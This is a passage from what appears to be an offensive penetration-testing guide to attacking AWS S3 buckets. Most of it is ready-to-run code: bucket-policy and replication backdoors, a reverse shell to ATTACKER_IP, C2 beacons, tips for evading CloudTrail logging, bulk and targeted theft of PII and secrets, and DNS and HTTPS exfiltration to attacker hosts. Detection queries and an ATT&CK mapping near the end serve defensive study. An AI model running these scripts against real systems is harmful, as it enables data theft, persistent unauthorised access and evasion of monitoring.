      "arn:aws:s3:::'$BUCKET'",
      "arn:aws:s3:::'$BUCKET'/*"
    ],
    "Condition": {
      "StringEquals": {
        "aws:UserAgent": "CloudTrail/AuditAgent"
      }
    }
  }]' > /tmp/backdoor-policy.json
  
  aws s3api put-bucket-policy --bucket $BUCKET \
    --policy file:///tmp/backdoor-policy.json
  
  # Access from attacker account using specific User-Agent
  # (Condition acts as a "password" for the backdoor)
  AWS_PROFILE=attacker aws s3 ls s3://$BUCKET/ \
    --cli-connect-timeout 5 \
    --cli-read-timeout 5
  # This won't work without the User-Agent condition
  
  # Use with custom User-Agent via SDK:
  python3 -c "
  import boto3
  from botocore.config import Config
  
  config = Config(user_agent='CloudTrail/AuditAgent')
  s3 = boto3.client('s3', config=config)
  objects = s3.list_objects_v2(Bucket='$BUCKET')
  for obj in objects.get('Contents', []):
      print(obj['Key'])
  "
  ```
  :::

  :::tabs-item{icon="i-lucide-repeat" label="Replication Backdoor"}
  ```bash [Cross-Region Replication Persistence]
  # ============================================
  # Replicate target bucket to attacker-controlled bucket
  # ============================================
  
  TARGET_BUCKET="target-company-data"
  ATTACKER_BUCKET="monitoring-backup-$(date +%s)"
  ATTACKER_ACCOUNT="999888777666"
  
  # 1. Create destination bucket in attacker account
  AWS_PROFILE=attacker aws s3 mb s3://$ATTACKER_BUCKET --region us-west-2
  
  # 2. Enable versioning on both buckets (required for replication)
  aws s3api put-bucket-versioning --bucket $TARGET_BUCKET \
    --versioning-configuration Status=Enabled
  
  AWS_PROFILE=attacker aws s3api put-bucket-versioning --bucket $ATTACKER_BUCKET \
    --versioning-configuration Status=Enabled
  
  # 3. Create replication IAM role
  cat > /tmp/replication-trust.json << EOF
  {
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Principal": {"Service": "s3.amazonaws.com"},
      "Action": "sts:AssumeRole"
    }]
  }
  EOF
  
  ROLE_ARN=$(aws iam create-role \
    --role-name S3ReplicationRole \
    --assume-role-policy-document file:///tmp/replication-trust.json \
    --query 'Role.Arn' --output text)
  
  # 4. Attach replication policy
  cat > /tmp/replication-policy.json << EOF
  {
    "Version": "2012-10-17",
    "Statement": [
      {
        "Effect": "Allow",
        "Action": ["s3:GetReplicationConfiguration", "s3:ListBucket"],
        "Resource": "arn:aws:s3:::$TARGET_BUCKET"
      },
      {
        "Effect": "Allow",
        "Action": ["s3:GetObjectVersionForReplication", "s3:GetObjectVersionAcl",
                   "s3:GetObjectVersionTagging"],
        "Resource": "arn:aws:s3:::$TARGET_BUCKET/*"
      },
      {
        "Effect": "Allow",
        "Action": ["s3:ReplicateObject", "s3:ReplicateDelete", "s3:ReplicateTags"],
        "Resource": "arn:aws:s3:::$ATTACKER_BUCKET/*"
      }
    ]
  }
  EOF
  
  aws iam put-role-policy \
    --role-name S3ReplicationRole \
    --policy-name ReplicationPolicy \
    --policy-document file:///tmp/replication-policy.json
  
  # 5. Set destination bucket policy (allow replication from source)
  AWS_PROFILE=attacker aws s3api put-bucket-policy --bucket $ATTACKER_BUCKET --policy '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Principal": {"AWS": "'$ROLE_ARN'"},
      "Action": ["s3:ReplicateObject", "s3:ReplicateDelete"],
      "Resource": "arn:aws:s3:::'$ATTACKER_BUCKET'/*"
    }]
  }'
  
  # 6. Enable replication on source bucket
  aws s3api put-bucket-replication --bucket $TARGET_BUCKET --replication-configuration '{
    "Role": "'$ROLE_ARN'",
    "Rules": [{
      "ID": "FullReplication",
      "Status": "Enabled",
      "Priority": 1,
      "Filter": {},
      "Destination": {
        "Bucket": "arn:aws:s3:::'$ATTACKER_BUCKET'",
        "Account": "'$ATTACKER_ACCOUNT'"
      },
      "DeleteMarkerReplication": {"Status": "Enabled"}
    }]
  }'
  
  echo "[+] Replication configured!"
  echo "[+] All new objects in $TARGET_BUCKET will replicate to $ATTACKER_BUCKET"
  ```
  :::

  :::tabs-item{icon="i-lucide-bell" label="Event Notification Backdoor"}
  ```bash [S3 Event Notification Persistence]
  # ============================================
  # Trigger Lambda/SQS/SNS on every S3 action
  # ============================================
  
  TARGET_BUCKET="target-company-data"
  
  # Option 1: Send notifications to attacker's SQS queue
  # (requires cross-account SQS policy)
  
  aws s3api put-bucket-notification-configuration \
    --bucket $TARGET_BUCKET \
    --notification-configuration '{
      "QueueConfigurations": [{
        "Id": "AuditLogging",
        "QueueArn": "arn:aws:sqs:us-east-1:ATTACKER_ACCOUNT:s3-monitor",
        "Events": [
          "s3:ObjectCreated:*",
          "s3:ObjectRemoved:*",
          "s3:ObjectRestore:*"
        ]
      }],
      "LambdaFunctionConfigurations": [{
        "Id": "MetricsCollector",
        "LambdaFunctionArn": "arn:aws:lambda:us-east-1:TARGET_ACCOUNT:function:backdoor-function",
        "Events": ["s3:ObjectCreated:*"]
      }]
    }'
  
  # Every object upload now triggers your function/queue!
  # You receive notifications about ALL new files
  ```
  :::

  :::tabs-item{icon="i-lucide-eye-off" label="Object-Level Backdoor"}
  ```bash [Hidden Object Persistence]
  # ============================================
  # Hide persistent access in S3 objects
  # ============================================
  
  BUCKET="target-company-data"
  
  # 1. Create an object with a "hidden" name (dot-prefix)
  echo '{"key":"AKIAXXXXXXXX","secret":"XXXXXXXX"}' | \
    aws s3 cp - s3://$BUCKET/.system/.metrics/config.dat
  
  # 2. Store a reverse shell script
  cat > /tmp/maintenance.sh << 'EOF'
  #!/bin/bash
  # "Maintenance" script — actually a reverse shell
  bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
  EOF
  
  aws s3 cp /tmp/maintenance.sh s3://$BUCKET/.system/maintenance.sh
  
  # 3. Store backdoor Lambda code
  # When someone deploys from this bucket, they deploy your backdoor
  
  # 4. Use object metadata for C2
  aws s3api put-object \
    --bucket $BUCKET \
    --key ".system/heartbeat" \
    --body /dev/null \
    --metadata '{"cmd":"curl https://ATTACKER.com/beacon","interval":"3600"}'
  
  # Read C2 commands from metadata
  aws s3api head-object --bucket $BUCKET --key ".system/heartbeat" \
    --query 'Metadata'
  ```
  :::
::

### Evasion Techniques

::accordion

  :::accordion-item
  ---
  icon: i-lucide-eye-off
  label: "Evasion: CloudTrail Data Events"
  ---
  ```bash [CloudTrail S3 Evasion]
  # S3 DATA EVENTS are NOT logged by default in CloudTrail!
  # Only management events (CreateBucket, PutBucketPolicy) are logged
  
  # Data events (GetObject, PutObject, DeleteObject) require
  # explicit CloudTrail configuration
  
  # Check if S3 data events are being logged
  aws cloudtrail get-event-selectors --trail-name default
  aws cloudtrail get-event-selectors --trail-name default \
    --query 'EventSelectors[*].DataResources[?Type==`AWS::S3::Object`]'
  
  # If data events are NOT configured:
  # → Your GetObject/PutObject calls are INVISIBLE
  # → Download everything without detection
  
  # If data events ARE configured:
  # → Use presigned URLs (generated from API call, but download is via HTTPS)
  # → Use S3 Select for targeted extraction
  # → Use VPC endpoints (traffic stays within AWS)
  
  # Management events that ARE always logged:
  # - CreateBucket
  # - DeleteBucket
  # - PutBucketPolicy
  # - PutBucketAcl
  # - PutBucketReplication
  # - PutBucketNotification
  
  # Strategy: Avoid management API calls
  # Only use GetObject/ListBucket for data access
  ```
  :::

  :::accordion-item
  ---
  icon: i-lucide-eye-off
  label: "Evasion: S3 Select (Targeted Extraction)"
  ---
  ```bash [S3 Select — Surgical Data Extraction]
  # S3 Select lets you query data WITHIN objects
  # Only returns matching records — less data transfer = less suspicious
  
  # Query CSV file for specific records
  aws s3api select-object-content \
    --bucket target-bucket \
    --key "data/users.csv" \
    --expression "SELECT * FROM s3object s WHERE s.\"role\" = 'admin'" \
    --expression-type SQL \
    --input-serialization '{"CSV":{"FileHeaderInfo":"USE"}}' \
    --output-serialization '{"CSV":{}}' \
    /tmp/admin-users.csv
  
  # Query JSON file
  aws s3api select-object-content \
    --bucket target-bucket \
    --key "data/config.json" \
    --expression "SELECT s.password, s.api_key FROM s3object[*] s" \
    --expression-type SQL \
    --input-serialization '{"JSON":{"Type":"DOCUMENT"}}' \
    --output-serialization '{"JSON":{}}' \
    /tmp/extracted-secrets.json
  
  # Query Parquet files (common in data lakes)
  aws s3api select-object-content \
    --bucket target-datalake \
    --key "analytics/user_data.parquet" \
    --expression "SELECT email, ssn, credit_card FROM s3object" \
    --expression-type SQL \
    --input-serialization '{"Parquet":{}}' \
    --output-serialization '{"CSV":{}}' \
    /tmp/pii-extract.csv
  ```
  :::

  :::accordion-item
  ---
  icon: i-lucide-eye-off
  label: "Evasion: VPC Endpoint Access"
  ---
  ```bash [VPC Endpoint — Private Access]
  # Access S3 through VPC endpoint — traffic never leaves AWS network
  # No internet-facing logs, harder to detect
  
  # If you've compromised an EC2 instance in a VPC with S3 endpoint:
  
  # Check for existing S3 VPC endpoint
  aws ec2 describe-vpc-endpoints \
    --filters "Name=service-name,Values=com.amazonaws.*.s3" \
    --query 'VpcEndpoints[*].[VpcEndpointId,VpcId,State]'
  
  # Access S3 through the endpoint
  # Traffic goes: EC2 → VPC Endpoint → S3 (never touches internet)
  aws s3 sync s3://target-bucket/ /tmp/loot/ \
    --endpoint-url https://bucket.vpce-XXXXXXXXX-XXXXXXXX.s3.us-east-1.vpce.amazonaws.com
  ```
  :::

::

---

## Data Exfiltration

### Exfiltration Methods

::tabs
  :::tabs-item{icon="i-lucide-download" label="Mass Download"}
  ```bash [Full Bucket Exfiltration]
  BUCKET="target-company-data"
  LOOT_DIR="./loot/$(date +%Y%m%d)"
  mkdir -p "$LOOT_DIR"
  
  # Method 1: AWS CLI sync (handles large transfers)
  aws s3 sync s3://$BUCKET/ "$LOOT_DIR/$BUCKET/" \
    --no-progress \
    --only-show-errors
  
  # Method 2: Selective — only sensitive files
  aws s3 ls s3://$BUCKET/ --recursive | \
    grep -iE '\.(sql|bak|dump|csv|xlsx|json|env|pem|key|tfstate|zip|tar\.gz)$' | \
    awk '{print $4}' | while read file; do
      mkdir -p "$LOOT_DIR/$BUCKET/$(dirname $file)"
      aws s3 cp "s3://$BUCKET/$file" "$LOOT_DIR/$BUCKET/$file" --no-progress
    done
  
  # Method 3: Prioritized download by file type
  declare -A PRIORITY
  PRIORITY[critical]="\.env|\.pem|\.key|credential|secret|password|\.tfstate|id_rsa"
  PRIORITY[high]="\.sql|\.bak|\.dump|\.csv|config\.(yml|yaml|json)"
  PRIORITY[medium]="\.xlsx|\.docx|\.pdf|\.zip|\.tar"
  
  for level in critical high medium; do
    echo "[*] Downloading $level priority files..."
    pattern="${PRIORITY[$level]}"
    aws s3 ls s3://$BUCKET/ --recursive | \
      grep -iE "$pattern" | awk '{print $4}' | while read file; do
        aws s3 cp "s3://$BUCKET/$file" "$LOOT_DIR/$BUCKET/$file" --no-progress 2>/dev/null
      done
  done
  
  # Method 4: Exfiltrate ALL buckets
  for bucket in $(aws s3api list-buckets --query 'Buckets[*].Name' --output text); do
    echo "[*] Exfiltrating: $bucket"
    aws s3 sync "s3://$bucket/" "$LOOT_DIR/$bucket/" --no-progress --only-show-errors 2>/dev/null
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-share" label="Cross-Account Copy"}
  ```bash [Cross-Account Exfiltration]
  # Copy data to attacker-controlled bucket
  
  TARGET_BUCKET="target-company-data"
  ATTACKER_BUCKET="research-data-backup-2024"
  
  # Direct copy (if target role has s3:PutObject on attacker bucket)
  aws s3 sync s3://$TARGET_BUCKET/ s3://$ATTACKER_BUCKET/exfil/
  
  # Via presigned URLs
  # Generate download URLs for all files
  aws s3 ls s3://$TARGET_BUCKET/ --recursive | awk '{print $4}' | while read key; do
    url=$(aws s3 presign "s3://$TARGET_BUCKET/$key" --expires-in 86400)
    echo "$key|$url"
  done > /tmp/presigned-urls.txt
  
  # Download from another machine using presigned URLs
  cat /tmp/presigned-urls.txt | while IFS='|' read key url; do
    curl -s -o "./loot/$key" "$url"
  done
  
  # Via EBS snapshot sharing
  # If data is on an EBS volume, snapshot and share
  aws ec2 create-snapshot --volume-id vol-XXX --description "backup"
  aws ec2 modify-snapshot-attribute \
    --snapshot-id snap-XXX \
    --attribute createVolumePermission \
    --operation-type add \
    --user-ids ATTACKER_ACCOUNT_ID
  ```
  :::

  :::tabs-item{icon="i-lucide-file-search" label="Targeted PII Extraction"}
  ```bash [PII Extraction]
  # Use S3 Select for surgical PII extraction
  
  BUCKET="target-company-datalake"
  
  # Find files containing PII patterns
  aws s3 ls s3://$BUCKET/ --recursive | \
    grep -iE 'customer|user|employee|patient|member|account' | \
    awk '{print $4}' | while read key; do
      echo "[*] Checking: $key"
      
      ext="${key##*.}"
      
      case $ext in
        csv)
          # Extract records with SSN pattern
          aws s3api select-object-content \
            --bucket $BUCKET \
            --key "$key" \
            --expression "SELECT * FROM s3object s WHERE s._3 LIKE '%-%-%'" \
            --expression-type SQL \
            --input-serialization '{"CSV":{"FileHeaderInfo":"NONE"}}' \
            --output-serialization '{"CSV":{}}' \
            "/tmp/pii-$(basename $key)" 2>/dev/null
          ;;
        json)
          # Extract records with email addresses
          aws s3api select-object-content \
            --bucket $BUCKET \
            --key "$key" \
            --expression "SELECT s.email, s.name, s.phone FROM s3object[*] s WHERE s.email IS NOT NULL" \
            --expression-type SQL \
            --input-serialization '{"JSON":{"Type":"DOCUMENT"}}' \
            --output-serialization '{"JSON":{}}' \
            "/tmp/pii-$(basename $key)" 2>/dev/null
          ;;
      esac
    done
  ```
  :::

  :::tabs-item{icon="i-lucide-cloud-off" label="Covert Exfiltration"}
  ```bash [Covert Channels]
  # ============================================
  # DNS-based exfiltration of S3 data
  # ============================================
  
  # Encode small files and exfil via DNS
  python3 << 'PYEOF'
  import boto3, base64, socket
  
  s3 = boto3.client('s3')
  
  # Download sensitive file
  obj = s3.get_object(Bucket='target-bucket', Key='secrets/api-keys.json')
  data = obj['Body'].read()
  
  # Encode and split
  encoded = base64.b32encode(data).decode().rstrip('=')
  chunks = [encoded[i:i+60] for i in range(0, len(encoded), 60)]
  
  # Exfiltrate via DNS queries
  for i, chunk in enumerate(chunks):
      query = f"{chunk}.{i}.exfil.attacker.com"
      try:
          socket.gethostbyname(query)
      except:
          pass
  PYEOF
  
  # ============================================
  # HTTPS-based covert exfiltration
  # ============================================
  
  # Exfil via HTTPS POST to attacker server
  aws s3 cp s3://target-bucket/secrets/db-creds.json - | \
    curl -s -X POST https://ATTACKER.com/collect \
      -H "Content-Type: application/json" \
      -d @-
  
  # ============================================
  # Exfiltrate via S3-to-S3 copy (if both accounts accessible)
  # ============================================
  
  # This avoids downloading data to your machine entirely
  # Data moves within AWS infrastructure
  python3 << 'PYEOF'
  import boto3
  
  s3 = boto3.client('s3')
  
  # Copy directly between buckets
  s3.copy_object(
      Bucket='attacker-bucket',
      Key='exfil/db-creds.json',
      CopySource={'Bucket': 'target-bucket', 'Key': 'secrets/db-creds.json'}
  )
  PYEOF
  ```
  :::
::

---

## Detection & Monitoring

### Key CloudTrail Events

| Event Name | Risk Indicator |
|-----------|---------------|
| `CreateBucket` | Potential rogue bucket creation |
| `DeleteBucket` | Evidence destruction |
| `PutBucketPolicy` | Policy manipulation / backdoor |
| `DeleteBucketPolicy` | Security control removal |
| `PutBucketAcl` | ACL manipulation / public access |
| `PutBucketPublicAccessBlock` | Removing public access blocks |
| `PutBucketReplication` | Cross-account data replication |
| `PutBucketNotificationConfiguration` | Event hijacking |
| `GetObject` (data event) | Data access / exfiltration |
| `PutObject` (data event) | Object injection / tampering |
| `DeleteObject` (data event) | Data destruction |
| `ListBucket` (data event) | Reconnaissance / enumeration |
| `GetBucketPolicy` | Policy reconnaissance |
| `GetBucketAcl` | ACL reconnaissance |
| `PutBucketWebsite` | Static hosting enablement |

### Detection Queries

```sql [Athena — S3 Security Monitoring]
-- Buckets made public
SELECT
    eventTime, userIdentity.arn AS actor,
    requestParameters.bucketName AS bucket,
    sourceIPAddress, eventName
FROM cloudtrail_logs
WHERE eventName IN ('PutBucketPolicy', 'PutBucketAcl', 'PutBucketPublicAccessBlock')
AND eventTime > current_timestamp - interval '7' day
ORDER BY eventTime DESC;

-- Large-scale data downloads (requires S3 data events)
SELECT
    userIdentity.arn AS actor,
    requestParameters.bucketName AS bucket,
    COUNT(*) AS object_count,
    DATE(eventTime) AS date
FROM cloudtrail_logs
WHERE eventName = 'GetObject'
AND eventTime > current_timestamp - interval '1' day
GROUP BY userIdentity.arn, requestParameters.bucketName, DATE(eventTime)
HAVING COUNT(*) > 100
ORDER BY object_count DESC;

-- Unusual cross-account access
SELECT
    eventTime, userIdentity.arn AS actor,
    userIdentity.accountId AS source_account,
    requestParameters.bucketName AS bucket,
    eventName, sourceIPAddress
FROM cloudtrail_logs
WHERE eventName IN ('GetObject', 'PutObject', 'ListBucket')
AND userIdentity.accountId != 'YOUR_ACCOUNT_ID'
ORDER BY eventTime DESC;

-- Bucket replication changes (persistence indicator)
SELECT
    eventTime, userIdentity.arn AS actor,
    requestParameters.bucketName AS bucket,
    requestParameters.replicationConfiguration AS replication_config,
    sourceIPAddress
FROM cloudtrail_logs
WHERE eventName = 'PutBucketReplication'
ORDER BY eventTime DESC;
```

---

## Tools Arsenal

::card-group

  :::card
  ---
  icon: i-simple-icons-github
  title: S3Scanner
  to: https://github.com/sa7mon/S3Scanner
  target: _blank
  ---
  Scan for open S3 buckets and dump their contents. Supports authenticated and unauthenticated scanning.
  :::

  :::card
  ---
  icon: i-simple-icons-github
  title: cloud_enum
  to: https://github.com/initstring/cloud_enum
  target: _blank
  ---
  Multi-cloud OSINT tool. Enumerates S3 buckets, Azure blobs, and GCP buckets using keyword mutations.
  :::

  :::card
  ---
  icon: i-simple-icons-github
  title: AWSBucketDump
  to: https://github.com/jordanpotti/AWSBucketDump
  target: _blank
  ---
  Quickly enumerate S3 buckets and search for interesting files using keyword matching.
  :::

  :::card
  ---
  icon: i-simple-icons-github
  title: BucketFinder
  to: https://github.com/dionach/bucket_finder
  target: _blank
  ---
  Brute-force S3 bucket names and check for public access, listing, and read/write permissions.
  :::

  :::card
  ---
  icon: i-simple-icons-github
  title: Prowler — S3 Checks
  to: https://github.com/prowler-cloud/prowler
  target: _blank
  ---
  Automated S3 security checks: public access, encryption, logging, versioning, MFA delete, and more.
  :::

  :::card
  ---
  icon: i-simple-icons-github
  title: ScoutSuite
  to: https://github.com/nccgroup/ScoutSuite
  target: _blank
  ---
  Multi-cloud security auditing. Comprehensive S3 misconfiguration detection with HTML report.
  :::

  :::card
  ---
  icon: i-simple-icons-github
  title: TruffleHog
  to: https://github.com/trufflesecurity/trufflehog
  target: _blank
  ---
  Scan S3 buckets (and git repos) for leaked credentials, API keys, and secrets.
  :::

  :::card
  ---
  icon: i-lucide-globe
  title: GrayhatWarfare
  to: https://buckets.grayhatwarfare.com
  target: _blank
  ---
  Search engine for exposed S3 buckets. Find publicly accessible files across millions of indexed buckets.
  :::

::

---

## MITRE ATT&CK Mapping

| Tactic | Technique | S3 Context |
|--------|-----------|-----------|
| **Reconnaissance** | T1593 — Search Open Websites | Discover S3 URLs in web content |
| **Reconnaissance** | T1596 — Search Open Technical DBs | GrayhatWarfare, Shodan for open buckets |
| **Resource Development** | T1584 — Compromise Infrastructure | S3 subdomain takeover |
| **Initial Access** | T1190 — Exploit Public-Facing App | Exploit publicly accessible S3 bucket |
| **Initial Access** | T1078 — Valid Accounts | Use leaked AWS credentials from S3 |
| **Execution** | T1059 — Command/Script Interpreter | Execute code via S3-triggered Lambda |
| **Persistence** | T1098 — Account Manipulation | Modify bucket policies for persistent access |
| **Persistence** | T1525 — Implant Container Image | Upload backdoored deployment packages |
| **Privilege Escalation** | T1552.001 — Credentials in Files | Extract AWS keys from .tfstate, .env files |
| **Defense Evasion** | T1562 — Impair Defenses | Disable S3 logging, remove CloudTrail |
| **Defense Evasion** | T1070 — Indicator Removal | Delete access logs, modify policies |
| **Credential Access** | T1552 — Unsecured Credentials | Plaintext passwords in S3 objects |
| **Discovery** | T1083 — File and Directory Discovery | List bucket contents, identify sensitive files |
| **Lateral Movement** | T1080 — Taint Shared Content | Upload malicious files to shared buckets |
| **Collection** | T1530 — Data from Cloud Storage | Access and collect data from S3 buckets |
| **Exfiltration** | T1537 — Transfer to Cloud Account | Copy data to attacker-controlled bucket |
| **Exfiltration** | T1048 — Exfiltration Over Alternative Protocol | DNS-based exfiltration of S3 data |
| **Impact** | T1485 — Data Destruction | Delete or encrypt bucket contents |
| **Impact** | T1491 — Defacement | Modify static website content |

---

## Real-World Attack Scenario

::steps{level="3"}

### Discover Bucket via JavaScript Analysis

```bash [Step 1 — Discovery]
# Found API endpoint in frontend JavaScript
curl -s https://target.com/app.js | grep -oP '[a-zA-Z0-9._-]+\.s3[a-zA-Z0-9.-]*\.amazonaws\.com'
# Output: target-company-uploads.s3.us-east-1.amazonaws.com

# Also found in HTML img tags
curl -s https://target.com | grep -oP 'https://target-company-[a-z]+\.s3\.amazonaws\.com/[^"]*'
# Output: https://target-company-assets.s3.amazonaws.com/images/logo.png
```

### Test for Public Access

```bash [Step 2 — Access Testing]
# Test listing
aws s3 ls s3://target-company-uploads --no-sign-request
# SUCCESS — 47,293 objects listed!

# Test another bucket
aws s3 ls s3://target-company-backups --no-sign-request
# Access Denied — but let's check specific paths...

curl -s "https://target-company-backups.s3.amazonaws.com/?acl" | xmllint --format -
# ACL shows AuthenticatedUsers have READ access!

# Test with ANY valid AWS account
aws s3 ls s3://target-company-backups
# SUCCESS — Can list with any authenticated AWS user!
```

### Extract Sensitive Data

```bash [Step 3 — Data Extraction]
# Found in target-company-uploads:
# - customer_exports/2024-Q1-customers.csv (2.3GB)
# - reports/financial/annual-report-2024.xlsx
# - config/database.yml

# Download sensitive files
aws s3 cp s3://target-company-uploads/config/database.yml /tmp/ --no-sign-request
# Contains: RDS endpoint, username, password in plaintext!

# Found in target-company-backups:
# - daily/2024-03-15/production-db.sql.gz
# - terraform/terraform.tfstate

aws s3 cp s3://target-company-backups/terraform/terraform.tfstate /tmp/

# Extract AWS credentials from terraform state
cat /tmp/terraform.tfstate | jq -r '.. | .access_key? // empty' 2>/dev/null
# Output: AKIAIOSFODNN7EXAMPLE

cat /tmp/terraform.tfstate | jq -r '.. | .secret_key? // empty' 2>/dev/null
# Output: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

### Escalate to Full Account Access

```bash [Step 4 — Privilege Escalation]
# Use discovered IAM credentials
export AWS_ACCESS_KEY_ID="AKIAIOSFODNN7EXAMPLE"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"

aws sts get-caller-identity
# Account: 123456789012
# User: terraform-deployer (has AdministratorAccess!)

# Full account compromise achieved
aws iam list-users
aws s3api list-buckets
aws ec2 describe-instances
aws rds describe-db-instances
aws secretsmanager list-secrets
```

### Establish Persistence and Report

```bash [Step 5 — Persistence & Reporting]
# Document everything for the report
# Establish persistence for continued access verification

# Add subtle bucket policy backdoor
# Set up replication to monitoring bucket
# Generate presigned URLs for evidence

# CLEAN UP all test artifacts
# Submit detailed report with remediation steps
```

::

---

::field-group

  :::field{name="Discovery Methods" type="number"}
  **15+** — DNS enumeration, subdomain scanning, certificate transparency, web scraping, JavaScript analysis, brute-forcing, Google dorking, GitHub searching, Wayback Machine, Shodan, GrayhatWarfare, cloud_enum, S3Scanner, bucket_finder, AWSBucketDump
  :::

  :::field{name="Attack Techniques" type="number"}
  **25+** — Public read/write/list abuse, ACL manipulation, policy backdooring, presigned URL attacks, subdomain takeover, object injection, supply chain poisoning, credential extraction, Terraform state exploitation, cross-account replication, event notification hijacking, S3 Select extraction, version recovery, VPC endpoint abuse
  :::

  :::field{name="Persistence Methods" type="number"}
  **8+** — Hidden policy statements with conditions, cross-region replication, event notifications, object-level ACLs, hidden objects, Lambda trigger injection, access point abuse, lifecycle rule manipulation
  :::

::

::tip
**Critical Reminder**: S3 data events are **not logged by default** in CloudTrail. During your pentest, verify whether the target has S3 data event logging enabled. If not, your data access operations are completely invisible. Always recommend enabling S3 data event logging in your report.
::